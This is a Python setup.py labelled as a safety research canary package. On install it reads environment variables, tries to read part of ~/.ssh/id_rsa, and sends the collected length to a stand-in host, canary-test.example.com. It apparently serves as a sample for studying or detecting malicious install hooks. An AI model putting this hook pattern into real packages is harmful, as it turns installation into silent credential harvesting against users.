"""
SAFETY RESEARCH PACKAGE — NOT REAL MALWARE.
Technique: environment harvest — reads os.environ and tries ~/.ssh/id_rsa,
then beacons the length of collected data to a canary URL.
The data itself is NOT sent (only its length), so no actual secrets are exfiltrated.
Sink: canary-test.example.com (fake).
"""
import os
import urllib.request
from setuptools import setup

try:
    _collected = os.environ.get("HOME", "") + os.environ.get("USER", "")
    try:
        with open(os.path.expanduser("~/.ssh/id_rsa"), "rb") as _f:
            _collected += str(len(_f.read(32)))   # read only 32 bytes; never exfiltrate
    except OSError:
        pass  # file absent — that is fine, the attempt is the signal
    _url = f"http://canary-test.example.com/collect?d={len(_collected)}"
    urllib.request.urlopen(_url, timeout=5)
except Exception:
    pass

setup(
    name="canary-env-harvest",
    version="1.0.0",
    description="[CORPUS] Environment harvest on install — safety research package",
    packages=["canary_env_harvest"],
)
